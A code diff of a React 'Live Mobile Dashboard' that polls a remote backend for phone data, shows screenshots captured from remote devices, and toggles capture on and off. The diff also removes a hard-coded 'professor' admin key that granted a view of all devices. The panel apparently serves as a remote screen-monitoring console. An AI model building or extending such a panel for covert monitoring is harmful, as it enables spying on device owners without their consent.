@@ -289,13 +289,13 @@ const BASE_URL = 'https://third-eye-txe8.onrender.com';
 export default function App() {
   const [accessKey, setAccessKey]       = useState(null);
   const [keyInput, setKeyInput]         = useState('');
-  const [isConnected, setIsConnected]   = useState(false);
+  const [isPosting, setIsPosting]       = useState(false);
   const [devicesMap, setDevicesMap]     = useState({});
   const [isLoading, setIsLoading]       = useState(false);
   const [connectionStatus, setConnectionStatus] = useState('disconnected');
   const [lastUpdate, setLastUpdate]     = useState(null);
 
-  // Fetch data every 5s
+  // 1) Fetch latest device data every 5s
   useEffect(() => {
     if (!accessKey) return;
     const fetchData = async () => {
@@ -324,22 +324,22 @@ export default function App() {
     return () => clearInterval(iv);
   }, [accessKey]);
 
-  // Toggle capture on/off
-  const toggleConnection = async () => {
-    const enable = !isConnected;
+  // 2) Start/Stop posting
+  const togglePosting = async () => {
+    const enable = !isPosting;
     try {
       const res = await fetch(`${BASE_URL}/control/${accessKey}`, {
         method: 'POST',
         headers: {'Content-Type':'application/json'},
         body: JSON.stringify({ capture_enabled: enable })
       });
-      if (res.ok) setIsConnected(enable);
+      if (res.ok) setIsPosting(enable);
     } catch (err) {
       console.error(err);
     }
   };
 
-  // Login screen
+  // 3) Login screen
   if (!accessKey) {
     return (
       <div className="min-h-screen flex items-center justify-center bg-slate-900">
@@ -352,7 +352,7 @@ export default function App() {
             type="text"
             value={keyInput}
             onChange={e => setKeyInput(e.target.value)}
-            placeholder="enter key"
+            placeholder="Your code"
             className="w-full px-4 py-2 mb-4 rounded bg-gray-700 text-white"
           />
           <button type="submit" className="w-full bg-purple-600 text-white py-2 rounded">
@@ -363,7 +363,7 @@ export default function App() {
     );
   }
 
-  // Loading
+  // 4) Loading state
   if (isLoading) {
     return (
       <div className="min-h-screen flex items-center justify-center bg-slate-900">
@@ -375,7 +375,7 @@ export default function App() {
     );
   }
 
-  // Build device list
+  // 5) Build device list
   const allDevices = Object.entries(devicesMap).map(([uid, entry]) => ({
     install_uid: uid,
     ...entry.data,
@@ -391,7 +391,7 @@ export default function App() {
   const isDeviceActive = ts =>
     ts && (Date.now() - new Date(ts).getTime() < 30000);
 
-  // Dashboard
+  // 6) Dashboard
   return (
     <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900">
       <header className="p-6 flex flex-col lg:flex-row items-center justify-between gap-4">
@@ -402,25 +402,23 @@ export default function App() {
           <div>
             <h1 className="text-4xl font-black text-white">Live Mobile Dashboard</h1>
             <p className="text-gray-400 text-sm mt-1">
-              {accessKey === 'professor'
-                ? 'Administrator view — all devices'
-                : `Device: ${accessKey}`}
+              Device: {accessKey}
             </p>
           </div>
         </div>
 
-        {/* Connect / Disconnect */}
+        {/* Start/Stop Posting */}
         <button
-          onClick={toggleConnection}
+          onClick={togglePosting}
           className={`px-4 py-2 rounded-full font-medium ${
-            isConnected ? 'bg-red-600 hover:bg-red-700' : 'bg-green-600 hover:bg-green-700'
+            isPosting ? 'bg-red-600 hover:bg-red-700' : 'bg-green-600 hover:bg-green-700'
           } text-white`}
         >
-          {isConnected ? 'Disconnect' : 'Connect'}
+          {isPosting ? 'Stop Posting' : 'Start Posting'}
         </button>
 
+        {/* Connection & Stats */}
         <div className="flex items-center gap-4">
-          {/* Connection Status */}
           <div className="flex items-center gap-2 px-4 py-2 bg-black/20 backdrop-blur-sm rounded-xl border border-white/10">
             {connectionStatus === 'connecting' ? (
               <Wifi className="w-4 h-4 animate-pulse"/>
@@ -432,21 +430,17 @@ export default function App() {
             <span className={`text-sm font-medium ${
               connectionStatus === 'connected'   ? 'text-green-400' :
               connectionStatus === 'connecting'  ? 'text-yellow-400' :
-                                                     'text-red-400'
+                                                    'text-red-400'
             }`}>
               {connectionStatus.charAt(0).toUpperCase() + connectionStatus.slice(1)}
             </span>
           </div>
-
-          {/* Active / Total */}
           <div className="flex items-center gap-2 px-4 py-2 bg-black/20 backdrop-blur-sm rounded-xl border border-white/10">
             <Smartphone className="w-4 h-4 text-blue-400"/>
             <span className="text-white text-sm font-medium">
               {getActiveDevices()}/{visibleDevices.length} Active
             </span>
           </div>
-
-          {/* Last Update */}
           {lastUpdate && (
             <div className="flex items-center gap-2 px-4 py-2 bg-black/20 backdrop-blur-sm rounded-xl border border-white/10">
               <Clock className="w-4 h-4 text-gray-400"/>
@@ -458,7 +452,7 @@ export default function App() {
         </div>
       </header>
 
-      {/* Device Grid */}
+      {/* Grid of device cards */}
       <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-6 px-6">
         {visibleDevices.map(d => {
           const active = isDeviceActive(d.received_at);
@@ -468,13 +462,11 @@ export default function App() {
               key={d.install_uid}
               className="group bg-black/40 backdrop-blur-sm rounded-3xl border border-white/10 hover:border-purple-500/50 transition-transform transform hover:scale-105"
             >
-              {/* Card Header */}
+              {/* Header */}
               <div className="relative p-4 bg-gradient-to-r from-purple-500/20 to-blue-500/20 border-b border-white/10">
-                <div
-                  className={`absolute top-2 right-2 w-3 h-3 rounded-full ${
-                    active ? 'bg-green-400 animate-pulse' : 'bg-red-400'
-                  } shadow-lg`}
-                />
+                <div className={`absolute top-2 right-2 w-3 h-3 rounded-full ${
+                  active ? 'bg-green-400 animate-pulse' : 'bg-red-400'
+                } shadow-lg`}/>
                 <div className="flex items-center gap-3">
                   <div className="p-2 bg-white/10 rounded-xl">
                     <Smartphone className="w-5 h-5 text-purple-400"/>
@@ -503,7 +495,7 @@ export default function App() {
                 {d.screenshot_png_b64 ? (
                   <img
                     src={`data:image/webp;base64,${d.screenshot_png_b64}`}
-                    alt={`${d.device_name} screenshot`}
+                    alt="screenshot"
                     className="w-full h-full object-contain"
                     loading="lazy"
                   />
@@ -515,7 +507,7 @@ export default function App() {
                 )}
               </div>
 
-              {/* Card Footer */}
+              {/* Footer */}
               <div className="p-3 bg-black/30 backdrop-blur-sm">
                 <div className="flex items-center justify-between text-xs">
                   <span className={`flex items-center gap-1 font-medium ${
@@ -537,23 +529,6 @@ export default function App() {
           );
         })}
       </div>
-
-      {/* Footer */}
-      <footer className="mt-12 text-center">
-        <div className="inline-flex items-center gap-6 px-6 py-3 bg-black/20 backdrop-blur-sm rounded-2xl border border-white/10">
-          <div className="text-sm text-white">
-            Total Devices: <span className="font-bold">{visibleDevices.length}</span>
-          </div>
-          <div className="w-px h-4 bg-white/20"/>
-          <div className="text-sm text-white">
-            Active: <span className="font-bold text-green-400">{getActiveDevices()}</span>
-          </div>
-          <div className="w-px h-4 bg-white/20"/>
-          <div className="text-sm text-white">
-            Auto‑refresh: <span className="text-blue-400 font-bold">5s</span>
-          </div>
-        </div>
-      </footer>
     </div>
   );
 }
